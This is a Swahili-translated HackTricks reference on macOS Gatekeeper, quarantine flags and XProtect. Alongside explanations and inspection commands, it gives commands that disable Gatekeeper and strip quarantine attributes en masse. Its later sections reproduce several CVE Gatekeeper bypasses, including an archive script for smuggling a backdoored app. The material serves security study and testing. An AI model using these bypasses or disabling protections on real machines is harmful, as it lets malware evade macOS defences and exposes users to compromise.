# macOS Gatekeeper / Karantini / XProtect

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
* .

</details>

## Gatekeeper

**Gatekeeper** ni kipengele cha usalama kilichotengenezwa kwa mifumo ya uendeshaji ya Mac, kimeundwa kuhakikisha kuwa watumiaji **wanakimbia tu programu za kuaminika** kwenye mifumo yao. Inafanya kazi kwa **kuthibitisha programu** ambayo mtumiaji anapakua na kujaribu kufungua kutoka **vyanzo nje ya Duka la App**, kama programu, programu-jalizi, au pakiti ya usakinishaji.

Mfumo muhimu wa Gatekeeper uko katika **mchakato wake wa uthibitisho**. Inachunguza ikiwa programu iliyopakuliwa ime **sainiwa na mwandishi anayetambulika**, ikidhibitisha uhalali wa programu. Zaidi ya hayo, inahakikisha ikiwa programu ime **notarized na Apple**, ikithibitisha kuwa haina yaliyomo mabaya yanayojulikana na haijabadilishwa baada ya kufanyiwa notarization.

Kwa kuongezea, Gatekeeper inaimarisha udhibiti na usalama wa mtumiaji kwa **kuwahimiza watumiaji kuidhinisha ufunguzi** wa programu iliyopakuliwa kwa mara ya kwanza. Kinga hii husaidia kuzuia watumiaji kwa bahati mbaya kufanya kazi ya kuendesha nambari inayoweza kuwa na madhara ambayo wangeweza kufikiria ni faili ya data isiyo na madhara.

### Saini za Programu

Saini za programu, pia hujulikana kama saini za nambari, ni sehemu muhimu ya miundombinu ya usalama ya Apple. Hutumiwa kwa **kuthibitisha utambulisho wa mwandishi wa programu** (mwandishi) na kuhakikisha kuwa nambari haijabadilishwa tangu iliposainiwa mara ya mwisho.

Hivi ndivyo inavyofanya kazi:

1. **Kusaini Programu:** Wakati mwandishi anapokuwa tayari kusambaza programu yake, wan **saini programu hiyo kwa kutumia ufunguo wa kibinafsi**. Ufunguo huu wa kibinafsi unahusishwa na **cheti ambacho Apple inatoa kwa mwandishi** wanapojiandikisha katika Programu ya Watengenezaji wa Apple. Mchakato wa kusaini unajumuisha kujenga hashi ya kriptografia ya sehemu zote za programu na kuficha hashi hii na ufunguo wa kibinafsi wa mwandishi.
2. **Kusambaza Programu:** Programu iliyosainiwa kisha inasambazwa kwa watumiaji pamoja na cheti cha mwandishi, ambacho kina ufunguo wa umma unaofanana.
3. **Kuthibitisha Programu:** Wakati mtumiaji anapopakua na kujaribu kuendesha programu, mfumo wa uendeshaji wa Mac yao hutumia ufunguo wa umma kutoka kwa cheti cha mwandishi kufichua hashi. Kisha inahesabu upya hashi kulingana na hali ya sasa ya programu na kulinganisha hii na hashi iliyofichuliwa. Ikiwa zinafanana, inamaanisha **programu haijabadilishwa** tangu mwandishi aliposaini, na mfumo unaruhusu programu kuendeshwa.

Saini za programu ni sehemu muhimu ya teknolojia ya Gatekeeper ya Apple. Wakati mtumiaji anapojaribu **kufungua programu iliyopakuliwa kutoka kwenye mtandao**, Gatekeeper inathibitisha saini ya programu. Ikiwa imesainiwa na cheti kilichotolewa na Apple kwa mwandishi anayejulikana na nambari haijabadilishwa, Gatekeeper inaruhusu programu kuendeshwa. Vinginevyo, inazuia programu na kuwajulisha mtumiaji.

Kuanzia macOS Catalina, **Gatekeeper pia huchunguza ikiwa programu ime notarized** na Apple, ikiongeza safu ya ziada ya usalama. Mchakato wa notarization huchunguza programu kwa masuala ya usalama yanayojulikana na nambari mbaya, na ikiwa uchunguzi huu unapita, Apple huongeza tiketi kwa programu ambayo Gatekeeper inaweza kuthibitisha.

#### Angalia Saini

Wakati wa kuchunguza **sampuli ya zisizo za programu**, unapaswa daima **kuangalia saini** ya binary kwani **mwandishi** aliyosaini inaweza tayari kuwa **husiana** na **zisizo za programu.**
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Kuidhinisha

Mchakato wa kuidhinisha wa Apple hutumika kama kinga ya ziada kulinda watumiaji kutokana na programu zenye madhara. Inahusisha **mwendelezaji kuwasilisha maombi yao kwa uchunguzi** na **Huduma ya Kuidhinisha ya Apple**, ambayo isichanganywe na Ukaguzi wa Programu. Huduma hii ni **mfumo wa kiotomatiki** unaopitia programu iliyowasilishwa kwa uwepo wa **maudhui yenye nia mbaya** na masuala yoyote yanayowezekana na uwekaji wa saini ya kanuni.

Ikiwa programu **inapita** uchunguzi huu bila kuleta wasiwasi wowote, Huduma ya Kuidhinisha hutoa tiketi ya kuidhinisha. Mwendelezaji kisha anatakiwa **kuambatanisha tiketi hii kwenye programu yao**, mchakato unaojulikana kama 'kushona.' Zaidi ya hayo, tiketi ya kuidhinisha pia huwekwa mtandaoni ambapo Gatekeeper, teknolojia ya usalama ya Apple, inaweza kuipata.

Wakati mtumiaji anapoinstall au kuzindua programu kwa mara ya kwanza, uwepo wa tiketi ya kuidhinisha - iwe imefungwa kwenye kutekelezeka au kupatikana mtandaoni - **inamjulisha Gatekeeper kwamba programu imekuidhinishwa na Apple**. Kama matokeo, Gatekeeper huonyesha ujumbe maelezo katika dirisha la kuzindua awali, ukionyesha kuwa programu imepitia ukaguzi wa maudhui yenye nia mbaya na Apple. Mchakato huu hivyo huimarisha imani ya mtumiaji katika usalama wa programu wanazoinstall au kuzindua kwenye mifumo yao.

### Kuhesabu GateKeeper

GateKeeper ni, **vipengele vingi vya usalama** vinavyozuia programu zisizoaminika kutekelezwa na pia **moja ya vipengele**.

Inawezekana kuona **hali** ya GateKeeper kwa:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
Tafadhali kumbuka kuwa ukaguzi wa saini wa GateKeeper hufanywa tu kwa **faili zenye sifa ya Karantini**, si kwa kila faili.
{% endhint %}

GateKeeper itachunguza ikiwa kulingana na **mapendeleo na saini** binary inaweza kutekelezwa:

<figure><img src="../../../.gitbook/assets/image (1147).png" alt=""><figcaption></figcaption></figure>

Database inayoshikilia usanidi huu iko katika **`/var/db/SystemPolicy`**. Unaweza kukagua hii database kama root kwa:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Tambua jinsi sheria ya kwanza ilivyomalizika katika "**App Store**" na ile ya pili katika "**Developer ID**" na kwamba katika picha iliyopita ilikuwa **imezimishwa kutekeleza programu kutoka kwa App Store na waendelezaji waliojulikana**.\
Ikiwa **ubadilishe** mipangilio hiyo kuwa App Store, sheria za "**Notarized Developer ID" zitaondoka**.

Pia kuna maelfu ya sheria za **aina ya GKE**:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Hizi ni hashes zinazotoka **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** na **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

Au unaweza kuorodhesha habari iliyopita na:
```bash
sudo spctl --list
```
Chaguo **`--master-disable`** na **`--global-disable`** ya **`spctl`** italemaza kabisa ukaguzi wa saini hizi:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Wakati inapowezeshwa kabisa, chaguo jipya litatokea:

<figure><img src="../../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

Inawezekana **kuangalia ikiwa Programu itaruhusiwa na GateKeeper** na:
```bash
spctl --assess -v /Applications/App.app
```
Inawezekana kuongeza sheria mpya kwenye GateKeeper kuruhusu utekelezaji wa programu fulani kwa:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### Kuarantini Faili

Baada ya **kupakua** programu au faili, programu maalum za macOS kama vivinjari vya wavuti au wateja wa barua pepe **huziambatanisha sifa ya faili iliyozidishwa**, inayojulikana kama "**bendera ya kuarantini**," kwa faili iliyopakuliwa. Sifa hii hufanya kama hatua ya usalama kwa kumtambua faili kama inayotoka kwenye chanzo ambacho hakijathibitishwa (mtandao), na inaweza kuwa na hatari. Hata hivyo, si programu zote huziambatanisha sifa hii, kwa mfano, programu za wateja wa BitTorrent mara nyingi hupuuza mchakato huu.

**Uwepo wa bendera ya kuarantini hutoa ishara kwa kipengele cha usalama cha Gatekeeper cha macOS wakati mtumiaji anajaribu kutekeleza faili**.

Katika kesi ambapo **bendera ya kuarantini haipo** (kama ilivyo kwa faili zilizopakuliwa kupitia baadhi ya wateja wa BitTorrent), **uchunguzi wa Gatekeeper hauwezi kufanywa**. Hivyo, watumiaji wanapaswa kuwa waangalifu wanapofungua faili zilizopakuliwa kutoka vyanzo visivyo salama au visivyofahamika.

{% hint style="info" %}
**Kuchunguza** **uthabiti** wa sahihi za nambari ni mchakato **wenye kutumia rasilimali nyingi** ambao unajumuisha kuzalisha **hashes** za kriptografia za nambari na rasilimali zake zote zilizopangwa. Zaidi ya hayo, kuchunguza uthabiti wa cheti kunahusisha kufanya **uchunguzi mtandaoni** kwa seva za Apple kuona ikiwa kimebatilishwa baada ya kutolewa. Kwa sababu hizi, uchunguzi kamili wa sahihi ya nambari na uthibitishaji hauwezi **kutekelezwa kila wakati programu inapoanzishwa**.

Hivyo, uchunguzi huu **hufanywa tu wakati wa kutekeleza programu zilizo na sifa ya kuarantini**.
{% endhint %}

{% hint style="warning" %}
Sifa hii lazima **ithibitishwe na programu inayounda/inayopakua** faili.

Hata hivyo, faili zilizofungwa kwa mchanga zitakuwa na sifa hii imewekwa kwa kila faili wanayounda. Na programu zisizofungwa kwa mchanga zinaweza kuweka wenyewe, au kufafanua [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) funguo katika **Info.plist** ambayo itafanya mfumo kuweka sifa ya kuarantini ya `com.apple.quarantine` kwa faili zilizoanzishwa,
{% endhint %}

Inawezekana **kuangalia hali yake na kuwezesha/kulemaza** (inahitaji mizizi) kwa:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Unaweza pia **kupata kama faili ina sifa ya ziada ya karantini** na:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Angalia **thamani** ya **sifa za ziada** na tafuta programu iliyoandika sifa ya karantini na:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Kwa kweli mchakato "unaweza kuweka bendera za karantini kwenye faili inazounda" (nilijaribu kutumia bendera ya USER\_APPROVED kwenye faili niliyounda lakini haikuiweka): 

<details>

<summary>Msimbo wa Chanzo wa kuweka bendera za karantini</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

Na **ondoa** sifa hiyo kwa:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Na pata faili zote zilizowekwa karantini kwa:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Taarifa za karantini pia hufanywa katika database kuu inayosimamiwa na LaunchServices katika **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**.

#### **Quarantine.kext**

Upanuzi wa kernel unapatikana tu kupitia **cache ya kernel kwenye mfumo**; hata hivyo, unaweza kupakua **Kernel Debug Kit kutoka https://developer.apple.com/**, ambayo italeta toleo lililobainishwa la upanuzi.

### XProtect

XProtect ni kipengele kilichojengwa cha **kuzuia zisizo (anti-malware)** katika macOS. XProtect **huchunguza programu yoyote wakati inazinduliwa kwa mara ya kwanza au kuhaririwa dhidi ya database** yake ya programu hasidi inayojulikana na aina za faili hatari. Unapopakua faili kupitia programu fulani, kama Safari, Mail, au Messages, XProtect hufanya uchunguzi wa moja kwa moja wa faili hiyo. Ikiwa inalingana na programu hasidi inayojulikana katika database yake, XProtect itazuia faili hiyo isizinduliwe na kukuarifu kuhusu tishio.

Database ya XProtect inasasishwa **kwa mara kwa mara** na Apple na ufafanuzi mpya wa programu hasidi, na visasisho hivi hupakuliwa na kusakinishwa kiotomatiki kwenye Mac yako. Hii inahakikisha kuwa XProtect iko daima na taarifa za hivi karibuni kuhusu vitisho vinavyojulikana.

Hata hivyo, ni muhimu kufahamu kuwa **XProtect si suluhisho kamili la antivirus**. Inachunguza tu orodha maalum ya vitisho vinavyojulikana na haitoi uchunguzi wa moja kwa moja kama programu nyingi za antivirus.

Unaweza kupata taarifa kuhusu sasisho la XProtect la hivi karibuni kwa kukimbia:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect iko kwenye eneo lililolindwa na SIP kwenye **/Library/Apple/System/Library/CoreServices/XProtect.bundle** na ndani ya bundle unaweza kupata habari ambazo XProtect hutumia:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Inaruhusu nambari zenye cdhashes hizo kutumia ruhusa za zamani.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Orodha ya programu-jalizi na nyongeza ambazo haziruhusiwi kupakia kupitia BundleID na TeamID au kuonyesha toleo la chini.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Miongozo ya Yara ya kugundua programu hasidi.
- **`XProtect.bundle/Contents/Resources/gk.db`**: Hifadhidata ya SQLite3 yenye hash za programu zilizozuiwa na TeamIDs.

Tafadhali kumbuka kuna App nyingine katika **`/Library/Apple/System/Library/CoreServices/XProtect.app`** inayohusiana na XProtect ambayo haishiriki katika mchakato wa Gatekeeper.

### Sio Gatekeeper

{% hint style="danger" %}
Tafadhali elewa kuwa Gatekeeper **haitoi kila wakati** unapotekeleza programu, _**AppleMobileFileIntegrity**_ (AMFI) ita **thibitisha saini za nambari za utekelezaji** wakati unapotekeleza programu ambayo tayari imekwisha tekelezwa na kuthibitishwa na Gatekeeper.
{% endhint %}

Hivyo, hapo awali ilikuwa inawezekana kutekeleza programu ili kuicache na Gatekeeper, kisha **kurekebisha faili zisizo za utekelezaji za programu** (kama vile faili za Electron asar au NIB) na ikiwa hakukuwa na kinga nyingine mahali, programu ilitekelezwa na **maboresho ya uovu**.

Hata hivyo, sasa hii siwezekani kwa sababu macOS **inazuia kurekebisha faili** ndani ya vifurushi vya programu. Kwa hivyo, ikiwa utajaribu shambulio la [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), utagundua kuwa sasa haiwezekani kuitumia kwa sababu baada ya kutekeleza programu ili kuicache na Gatekeeper, hautaweza kurekebisha mfuko. Na ikiwa utabadilisha jina la saraka ya Contents kuwa NotCon (kama ilivyoelezwa katika shambulio), kisha utekeleze faili kuu ya programu ili kuicache na Gatekeeper, itasababisha kosa na haitatekelezwa.

## Kupita Mipangilio ya Gatekeeper

Njia yoyote ya kupita mipangilio ya Gatekeeper (kufanikiwa kufanya mtumiaji kupakua kitu na kuitekeleza wakati Gatekeeper inapaswa kuzuia) inachukuliwa kuwa udhaifu katika macOS. Hizi ni baadhi ya CVE zilizotengwa kwa mbinu zilizoruhusu kupita mipangilio ya Gatekeeper hapo awali:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Ilionekana kwamba ikiwa **Archive Utility** inatumika kwa kuchambua, faili zenye **njia zinazozidi wahusika 886** hazipati sifa ya ziada ya com.apple.quarantine. Hali hii kwa bahati mbaya inaruhusu faili hizo kupita kwenye ukaguzi wa usalama wa **Gatekeeper**.

Angalia [**ripoti ya awali**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) kwa maelezo zaidi.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Wakati programu inaundwa na **Automator**, habari kuhusu kinachohitajika kutekelezwa iko ndani ya `application.app/Contents/document.wflow` si kwenye utekelezaji. Utekelezaji ni tu utekelezaji wa jumla wa Automator unaoitwa **Automator Application Stub**.

Kwa hivyo, unaweza kufanya `application.app/Contents/MacOS/Automator\ Application\ Stub` **kuashiria kwa kiungo ishara kwa Automator Application Stub nyingine ndani ya mfumo** na itatekeleza kilicho ndani ya `document.wflow` (maandishi yako) **bila kuzindua Gatekeeper** kwa sababu utekelezaji halisi haujapata sifa ya karantini.

Mfano wa eneo linalotarajiwa: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Angalia [**ripoti ya awali**](https://ronmasas.com/posts/bypass-macos-gatekeeper) kwa maelezo zaidi.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Katika kipita hiki, faili ya zip iliumbwa na programu ikaanza kufanya kazi kutoka `application.app/Contents` badala ya `application.app`. Kwa hivyo, **sifa ya karantini** ilitekelezwa kwa **faili zote kutoka `application.app/Contents`** lakini **sio kwa `application.app`**, ambayo ndiyo Gatekeeper ilikuwa inakagua, hivyo Gatekeeper ilipitishwa kwa sababu wakati `application.app` ilipotumiwa haikuwa na sifa ya karantini.
```bash
zip -r test.app/Contents test.zip
```
Angalia [**ripoti ya asili**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) kwa maelezo zaidi.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Hata kama vipengele ni tofauti, kutumia udhaifu huu ni sawa sana na ule wa awali. Katika kesi hii tutazalisha Apple Archive kutoka **`application.app/Contents`** ili **`application.app` isipate sifa ya karantini** wakati inapobatuliwa na **Archive Utility**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Angalia [**ripoti ya asili**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) kwa maelezo zaidi.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL ya **`writeextattr`** inaweza kutumika kuzuia mtu yeyote kuandika sifa katika faili:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Zaidi ya hayo, muundo wa faili wa **AppleDouble** unaiga faili pamoja na ACEs zake.

Katika [**michochezi ya chanzo**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) ni inawezekana kuona kuwa uwakilishi wa maandishi wa ACL uliohifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** itawekwa kama ACL katika faili iliyopunguzwa. Kwa hivyo, ikiwa ulipunguza programu ndani ya faili ya zip na muundo wa faili wa **AppleDouble** na ACL ambayo inazuia xattrs nyingine kuandikwa kwake... xattr ya karantini haikuwekwa kwenye programu:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Angalia [**ripoti ya asili**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.

Tafadhali elewa kwamba hii inaweza pia kutumika na AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Iligunduliwa kwamba **Google Chrome haikuweka sifa ya karantini** kwa faili zilizopakuliwa kutokana na matatizo fulani ya ndani ya macOS.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

Muundo wa faili za AppleDouble hifadhi sifa za faili katika faili tofauti inayoanza na `._`, hii husaidia kunakili sifa za faili **kati ya mashine za macOS**. Hata hivyo, iligundulika kwamba baada ya kufuta faili ya AppleDouble, faili inayoanza na `._` **haikuwekewa sifa ya karantini**.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Kwa kuweza kuunda faili ambayo haitakuwa na sifa ya karantini ilikuwa **inawezekana kukiuka Gatekeeper.** Hila ilikuwa **kuunda programu ya faili ya DMG** kutumia mbinu ya jina la AppleDouble (anza na `._`) na kuunda **faili inayoonekana kama kiungo cha ishara kwa faili hii iliyofichwa** bila sifa ya karantini.\
Wakati **faili ya dmg inapotekelezwa**, kwa kuwa haina sifa ya karantini ita**pita Gatekeeper**.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### Zuia Quarantine xattr

Katika mfuko wa ".app" ikiwa quarantine xattr haijaongezwa, wakati inatekelezwa **Gatekeeper haitaanzishwa**.
